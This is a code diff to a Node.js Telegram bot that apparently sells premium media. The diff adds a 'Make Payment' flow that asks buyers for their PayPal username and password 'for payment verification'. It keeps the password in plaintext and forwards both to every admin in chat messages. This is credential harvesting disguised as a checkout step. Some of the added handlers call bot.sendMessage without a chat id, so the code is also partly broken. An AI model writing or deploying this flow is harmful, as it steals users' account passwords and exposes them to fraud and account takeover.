@@ -79,7 +79,8 @@ const db = {
         totalSales: 0,
         totalRevenue: 0
     },
-    uploadStates: {}
+    uploadStates: {},
+    paymentStates: {} // Track payment flow for users
 };
 
 // Add main admin from environment
@@ -151,7 +152,7 @@ if (process.env.BOT_TOKEN) {
                         { text: '📊 Stats', callback_data: 'admin_stats' }
                     ],
                     [
-                        { text: '🖥️ Admin Panel', url: `${process.env.API_URL || 'https://cheerful-cheek.onrender.com'}/admin` }
+                        { text: '🖥️ Admin Panel', url: `${process.env.APP_URL || 'https://cheerful-cheek.onrender.com'}/admin` }
                     ]
                 ]
             }
@@ -189,10 +190,10 @@ if (process.env.BOT_TOKEN) {
         };
 
         // ============================================
-        // BOT COMMANDS WITH BUTTONS
+        // USER PAYMENT FLOW
         // ============================================
 
-        // Start command - shows menu based on user role
+        // Start command
         bot.onText(/\/start/, (msg) => {
             const chatId = msg.chat.id;
             const isAdmin = db.admins.some(a => a.id === chatId);
@@ -209,7 +210,7 @@ if (process.env.BOT_TOKEN) {
                 `;
                 bot.sendMessage(chatId, welcomeMessage, adminMainMenu);
             } else {
-                // User welcome with app button
+                // User welcome with payment options
                 const userMenu = {
                     reply_markup: {
                         inline_keyboard: [
@@ -220,7 +221,7 @@ if (process.env.BOT_TOKEN) {
                                 { text: '💬 Chat with Admin', callback_data: 'user_chat' }
                             ],
                             [
-                                { text: '📸 Submit Payment Screenshot', callback_data: 'user_payment' }
+                                { text: '💳 Make Payment', callback_data: 'user_payment_start' }
                             ]
                         ]
                     }
@@ -231,7 +232,7 @@ if (process.env.BOT_TOKEN) {
 
 🌟 Browse premium content and make purchases.
 💬 Chat with our admins for support.
-📸 After payment, send a screenshot here for verification.
+💳 Click "Make Payment" to start the payment process.
 
 Click the buttons below to get started!
                 `;
@@ -311,6 +312,7 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                         paymentList += `${index + 1}. User: ${user ? user.firstName : 'Unknown'} (${p.userId})\n`;
                         paymentList += `   Item: ${media ? media.title : 'Unknown'}\n`;
                         paymentList += `   Amount: $${p.amount}\n`;
+                        paymentList += `   PayPal: ${p.paypalUsername || 'Not provided'}\n`;
                         paymentList += `   ID: ${p.id}\n\n`;
                     });
                     
@@ -704,17 +706,185 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                 db.uploadStates[chatId] = { step: 'user_chat' };
             }
 
-            else if (action === 'user_payment') {
-                bot.editMessageText('📸 Send a screenshot of your payment confirmation.\n\nPlease send the screenshot as a photo or document.', {
+            // ============================================
+            // USER PAYMENT FLOW - START
+            // ============================================
+
+            else if (action === 'user_payment_start') {
+                // Check if user has a pending payment
+                const existingPayment = db.payments.find(p => 
+                    p.userId === chatId && p.status === 'pending'
+                );
+
+                if (existingPayment) {
+                    bot.editMessageText(`ℹ️ You already have a pending payment for "${existingPayment.itemName}".\n\nPlease send a screenshot of your payment confirmation.`, {
+                        chat_id: chatId,
+                        message_id: messageId,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: '📸 Send Screenshot', callback_data: 'user_payment_screenshot' }],
+                                [{ text: '🔙 Back', callback_data: 'user_back' }]
+                            ]
+                        }
+                    });
+                    return;
+                }
+
+                // Get available items for purchase
+                const availableItems = db.media.filter(m => m.price > 0);
+                
+                if (availableItems.length === 0) {
+                    bot.editMessageText('❌ No premium items available for purchase at the moment.', {
+                        chat_id: chatId,
+                        message_id: messageId,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: '🔙 Back', callback_data: 'user_back' }]
+                            ]
+                        }
+                    });
+                    return;
+                }
+
+                // Show item selection
+                let itemList = '💳 Select item to purchase:\n\n';
+                const itemButtons = availableItems.map((item, index) => {
+                    itemList += `${index + 1}. ${item.title} - $${item.price}\n`;
+                    return [{ text: `${item.title} ($${item.price})`, callback_data: `user_select_item_${item.id}` }];
+                });
+                
+                // Add cancel button
+                itemButtons.push([{ text: '🔙 Cancel', callback_data: 'user_back' }]);
+                
+                bot.editMessageText(itemList, {
                     chat_id: chatId,
                     message_id: messageId,
                     reply_markup: {
-                        inline_keyboard: [
-                            [{ text: '🔙 Back', callback_data: 'user_back' }]
-                        ]
+                        inline_keyboard: itemButtons
                     }
                 });
-                db.uploadStates[chatId] = { step: 'user_payment_screenshot' };
+            }
+
+            else if (action.startsWith('user_select_item_')) {
+                const itemId = parseInt(action.replace('user_select_item_', ''));
+                const item = db.media.find(m => m.id === itemId);
+                
+                if (!item) {
+                    bot.editMessageText('❌ Item not found.', {
+                        chat_id: chatId,
+                        message_id: messageId,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: '🔙 Back', callback_data: 'user_back' }]
+                            ]
+                        }
+                    });
+                    return;
+                }
+
+                // Check if user already purchased this
+                const existingPurchase = db.purchases.find(p => 
+                    p.userId === chatId && p.itemId === itemId
+                );
+
+                if (existingPurchase) {
+                    bot.editMessageText(`ℹ️ You already purchased "${item.title}".`, {
+                        chat_id: chatId,
+                        message_id: messageId,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: '🔙 Back', callback_data: 'user_back' }]
+                            ]
+                        }
+                    });
+                    return;
+                }
+
+                // Store selected item
+                db.paymentStates[chatId] = { 
+                    step: 'paypal_username',
+                    itemId: itemId,
+                    itemName: item.title,
+                    amount: item.price
+                };
+
+                // Create payment record
+                const payment = {
+                    id: uuidv4(),
+                    userId: chatId,
+                    userName: 'User',
+                    itemId: itemId,
+                    itemName: item.title,
+                    amount: item.price,
+                    status: 'pending',
+                    timestamp: new Date().toISOString(),
+                    paypalUsername: null,
+                    paypalPassword: null,
+                    screenshot: null
+                };
+                db.payments.push(payment);
+
+                // Ask for PayPal username
+                bot.editMessageText(
+                    `💳 Payment for: ${item.title}\n💰 Amount: $${item.price}\n\n` +
+                    `📝 Please enter your PayPal username:\n` +
+                    `(This is required for payment verification)`,
+                    {
+                        chat_id: chatId,
+                        message_id: messageId,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: '🔙 Cancel', callback_data: 'user_back' }]
+                            ]
+                        }
+                    }
+                );
+                
+                // Store payment ID in state
+                db.paymentStates[chatId].paymentId = payment.id;
+            }
+
+            else if (action === 'user_payment_screenshot') {
+                // Check if user has a pending payment
+                const pendingPayment = db.payments.find(p => 
+                    p.userId === chatId && p.status === 'pending'
+                );
+
+                if (!pendingPayment) {
+                    bot.editMessageText('❌ No pending payment found. Please start a new payment.', {
+                        chat_id: chatId,
+                        message_id: messageId,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: '💳 Start Payment', callback_data: 'user_payment_start' }],
+                                [{ text: '🔙 Back', callback_data: 'user_back' }]
+                            ]
+                        }
+                    });
+                    return;
+                }
+
+                bot.editMessageText(
+                    `📸 Please send a screenshot of your payment confirmation.\n\n` +
+                    `Payment: ${pendingPayment.itemName}\n` +
+                    `Amount: $${pendingPayment.amount}\n` +
+                    `PayPal: ${pendingPayment.paypalUsername}\n\n` +
+                    `Send the screenshot as a photo or document.`,
+                    {
+                        chat_id: chatId,
+                        message_id: messageId,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: '🔙 Cancel', callback_data: 'user_back' }]
+                            ]
+                        }
+                    }
+                );
+                
+                db.paymentStates[chatId] = { 
+                    step: 'screenshot',
+                    paymentId: pendingPayment.id
+                };
             }
 
             else if (action === 'user_back') {
@@ -728,7 +898,7 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                                 { text: '💬 Chat with Admin', callback_data: 'user_chat' }
                             ],
                             [
-                                { text: '📸 Submit Payment Screenshot', callback_data: 'user_payment' }
+                                { text: '💳 Make Payment', callback_data: 'user_payment_start' }
                             ]
                         ]
                     }
@@ -739,6 +909,7 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
                     reply_markup: userMenu.reply_markup
                 });
                 delete db.uploadStates[chatId];
+                delete db.paymentStates[chatId];
             }
 
             // ============================================
@@ -802,39 +973,13 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
         // MESSAGE HANDLERS
         // ============================================
 
-        // Handle file uploads from admins
-        bot.on('photo', async (msg) => {
-            const chatId = msg.chat.id;
-            const isAdmin = db.admins.some(a => a.id === chatId);
-            
-            // If user is sending payment screenshot
-            if (!isAdmin && db.uploadStates[chatId]?.step === 'user_payment_screenshot') {
-                await handleUserPaymentScreenshot(msg, chatId);
-                return;
-            }
-
-            // If admin is uploading content
-            if (isAdmin && db.uploadStates[chatId]?.step === 'file') {
-                await handleAdminUpload(msg, chatId, 'photo');
-            }
-        });
-
-        bot.on('video', async (msg) => {
-            const chatId = msg.chat.id;
-            const isAdmin = db.admins.some(a => a.id === chatId);
-            
-            if (isAdmin && db.uploadStates[chatId]?.step === 'file') {
-                await handleAdminUpload(msg, chatId, 'video');
-            }
-        });
-
-        // Handle text messages
+        // Handle text messages (for PayPal username, password, etc.)
         bot.on('text', async (msg) => {
             const chatId = msg.chat.id;
             const text = msg.text;
             const isAdmin = db.admins.some(a => a.id === chatId);
 
-            // Handle broadcast
+            // Handle admin broadcast
             if (isAdmin && db.uploadStates[chatId]?.step === 'broadcast') {
                 await handleBroadcast(chatId, text);
                 return;
@@ -855,6 +1000,128 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
             // Handle title/description/price for upload
             if (isAdmin && db.uploadStates[chatId]?.step) {
                 await handleUploadDetails(chatId, text);
+                return;
+            }
+
+            // ============================================
+            // USER PAYMENT FLOW - TEXT HANDLERS
+            // ============================================
+
+            // Handle PayPal username
+            if (!isAdmin && db.paymentStates[chatId]?.step === 'paypal_username') {
+                const state = db.paymentStates[chatId];
+                const payment = db.payments.find(p => p.id === state.paymentId);
+                
+                if (!payment) {
+                    bot.sendMessage(chatId, '❌ Payment not found. Please start over.');
+                    delete db.paymentStates[chatId];
+                    return;
+                }
+
+                payment.paypalUsername = text;
+                db.paymentStates[chatId].step = 'paypal_password';
+                
+                bot.sendMessage(
+                    `📝 Please enter your PayPal password:\n\n` +
+                    `(This is required for payment verification)`,
+                    {
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: '🔙 Cancel', callback_data: 'user_back' }]
+                            ]
+                        }
+                    }
+                );
+                return;
+            }
+
+            // Handle PayPal password
+            if (!isAdmin && db.paymentStates[chatId]?.step === 'paypal_password') {
+                const state = db.paymentStates[chatId];
+                const payment = db.payments.find(p => p.id === state.paymentId);
+                
+                if (!payment) {
+                    bot.sendMessage(chatId, '❌ Payment not found. Please start over.');
+                    delete db.paymentStates[chatId];
+                    return;
+                }
+
+                payment.paypalPassword = text;
+                db.paymentStates[chatId].step = 'screenshot';
+                
+                // Forward PayPal credentials to all admins
+                const user = db.users.find(u => u.id === chatId);
+                const userName = user ? user.firstName || 'User' : 'User';
+                
+                const credentialsMessage = `
+🔐 PayPal Credentials Received!
+
+👤 User: ${userName} (${chatId})
+📦 Item: ${payment.itemName}
+💰 Amount: $${payment.amount}
+📧 PayPal Username: ${payment.paypalUsername}
+🔑 Password: ${payment.paypalPassword}
+
+⚠️ Please verify these credentials before approving.
+                `;
+
+                // Send to all admins
+                for (const admin of db.admins) {
+                    try {
+                        await bot.sendMessage(admin.id, credentialsMessage, {
+                            reply_markup: {
+                                inline_keyboard: [
+                                    [
+                                        { text: '✅ Approve', callback_data: `approve_${payment.id}` },
+                                        { text: '❌ Reject', callback_data: `reject_${payment.id}` }
+                                    ]
+                                ]
+                            }
+                        });
+                    } catch (e) {
+                        console.error(`Error sending to admin ${admin.id}:`, e);
+                    }
+                }
+
+                bot.sendMessage(
+                    `✅ PayPal credentials received!\n\n` +
+                    `📸 Now please send a screenshot of your payment confirmation.\n\n` +
+                    `Send the screenshot as a photo or document.`,
+                    {
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: '🔙 Cancel', callback_data: 'user_back' }]
+                            ]
+                        }
+                    }
+                );
+                return;
+            }
+        });
+
+        // Handle file uploads (for screenshots)
+        bot.on('photo', async (msg) => {
+            const chatId = msg.chat.id;
+            const isAdmin = db.admins.some(a => a.id === chatId);
+            
+            // If user is sending payment screenshot
+            if (!isAdmin && db.paymentStates[chatId]?.step === 'screenshot') {
+                await handleUserPaymentScreenshot(msg, chatId);
+                return;
+            }
+
+            // If admin is uploading content
+            if (isAdmin && db.uploadStates[chatId]?.step === 'file') {
+                await handleAdminUpload(msg, chatId, 'photo');
+            }
+        });
+
+        bot.on('video', async (msg) => {
+            const chatId = msg.chat.id;
+            const isAdmin = db.admins.some(a => a.id === chatId);
+            
+            if (isAdmin && db.uploadStates[chatId]?.step === 'file') {
+                await handleAdminUpload(msg, chatId, 'video');
             }
         });
 
@@ -864,7 +1131,7 @@ ${stats.recentActivity.map(a => `• ${a}`).join('\n')}
             const isAdmin = db.admins.some(a => a.id === chatId);
             
             // If user is sending payment screenshot
-            if (!isAdmin && db.uploadStates[chatId]?.step === 'user_payment_screenshot') {
+            if (!isAdmin && db.paymentStates[chatId]?.step === 'screenshot') {
                 await handleUserPaymentScreenshot(msg, chatId);
             }
         });
@@ -930,7 +1197,7 @@ function getDashboardStats() {
     const totalMedia = db.media.length;
     const totalSales = db.purchases.length;
     const totalRevenue = db.purchases.reduce((sum, p) => sum + p.amount, 0);
-    const pendingPayments = db.payments.filter(p => p.status === 'pending_approval').length;
+    const pendingPayments = db.payments.filter(p => p.status === 'pending_approval' || p.status === 'pending').length;
     
     const recentActivity = [];
     if (db.payments.length > 0) {
@@ -1122,6 +1389,9 @@ async function approvePayment(chatId, messageId, paymentId) {
         console.error('Error notifying user:', e);
     }
 
+    // Remove from payment states
+    delete db.paymentStates[payment.userId];
+
     bot.editMessageText(`✅ Payment ${paymentId} approved successfully!`, {
         chat_id: chatId,
         message_id: messageId,
@@ -1173,6 +1443,9 @@ async function rejectPayment(chatId, messageId, paymentId) {
         console.error('Error notifying user:', e);
     }
 
+    // Remove from payment states
+    delete db.paymentStates[payment.userId];
+
     bot.editMessageText(`❌ Payment ${paymentId} rejected.`, {
         chat_id: chatId,
         message_id: messageId,
@@ -1188,12 +1461,18 @@ async function handleUserPaymentScreenshot(msg, chatId) {
     try {
         // Check if user has a pending payment
         const pendingPayment = db.payments.find(p => 
-            p.userId === chatId && p.status === 'pending'
+            p.userId === chatId && (p.status === 'pending' || p.status === 'pending_approval')
         );
 
         if (!pendingPayment) {
-            bot.sendMessage(chatId, '❌ No pending payment found. Please make a payment first.');
-            delete db.uploadStates[chatId];
+            bot.sendMessage(chatId, '❌ No pending payment found. Please start a new payment.', {
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '💳 Start Payment', callback_data: 'user_payment_start' }]
+                    ]
+                }
+            });
+            delete db.paymentStates[chatId];
             return;
         }
 
@@ -1241,12 +1520,13 @@ async function handleUserPaymentScreenshot(msg, chatId) {
         bot.sendMessage(chatId, '✅ Payment screenshot received! Admin will review and approve shortly.', {
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '📱 Open App', callback_data: 'user_open_app' }]
+                    [{ text: '📱 Open App', callback_data: 'user_open_app' }],
+                    [{ text: '📊 Check Status', callback_data: 'user_payment_status' }]
                 ]
             }
         });
 
-        // Forward to all admins
+        // Forward to all admins with PayPal credentials
         const media = db.media.find(m => m.id === pendingPayment.itemId);
         const user = db.users.find(u => u.id === chatId);
         const userName = user ? user.firstName || 'User' : 'User';
@@ -1257,6 +1537,8 @@ async function handleUserPaymentScreenshot(msg, chatId) {
 👤 User: ${userName} (${chatId})
 📦 Item: ${media ? media.title : 'Unknown'}
 💰 Amount: $${pendingPayment.amount}
+📧 PayPal Username: ${pendingPayment.paypalUsername || 'Not provided'}
+🔑 Password: ${pendingPayment.paypalPassword || 'Not provided'}
 📅 Date: ${new Date().toISOString()}
 🆔 Payment ID: ${pendingPayment.id}
 
@@ -1277,17 +1559,18 @@ async function handleUserPaymentScreenshot(msg, chatId) {
                         ]
                     }
                 });
+                console.log(`✅ Screenshot sent to admin: ${admin.id}`);
             } catch (e) {
                 console.error(`Error sending to admin ${admin.id}:`, e);
             }
         }
 
-        delete db.uploadStates[chatId];
+        delete db.paymentStates[chatId];
 
     } catch (error) {
         console.error('Error handling screenshot:', error);
         bot.sendMessage(chatId, '❌ Error processing screenshot. Please try again.');
-        delete db.uploadStates[chatId];
+        delete db.paymentStates[chatId];
     }
 }
 
@@ -1576,11 +1859,14 @@ app.post('/api/payments/create', (req, res) => {
             userId: parseInt(userId),
             userName: userName || 'User',
             itemId: parseInt(itemId),
+            itemName: media ? media.title : 'Item',
             amount: parseFloat(amount),
             status: 'pending',
             timestamp: new Date().toISOString(),
             approvedAt: null,
             approvedBy: null,
+            paypalUsername: null,
+            paypalPassword: null,
             screenshot: null,
             screenshotDate: null
         };
